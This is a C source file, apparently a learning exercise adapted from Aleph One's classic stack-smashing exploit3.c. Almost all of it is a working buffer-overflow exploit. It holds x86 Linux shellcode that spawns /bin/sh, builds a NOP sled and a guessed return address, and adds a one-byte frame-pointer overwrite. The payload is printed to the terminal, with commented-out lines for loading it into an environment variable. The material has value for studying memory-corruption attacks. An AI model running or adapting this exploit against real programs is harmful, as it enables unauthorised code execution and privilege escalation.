/*
*  Aleph's shellcode with some more edits
*  Based on exploit3.c from http://insecure.org/stf/smashstack.html
*/

#include <stdlib.h>

#define DEFAULT_OFFSET                 -176
#define DEFAULT_BUFFER_SIZE            501
#define NOP                            0x90

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i;

  if (argc > 1) bsize  = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);

  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_sp() - offset;
  // printf("Using address: 0x%x\n", addr);

  ptr = buff;
  addr_ptr = (long *) ptr; //fill our address in like before
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  //but what's this? this is our overwrite byte for EBP!
  buff[192] = 0x04;

  //now we make our slide
  for (i = 193; i < bsize; i++)
    buff[i] = NOP;

  //into our shellcode at the end (minus one because null byte)
  ptr = buff + ( bsize - (strlen(shellcode)) - 1 );
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0'; //you make my math more annoying :(

  printf(buff); //vomit it into the terminal
  
  // memcpy(buff,"EGG=",4);
  // putenv(buff);
  // system("/bin/bash");
}
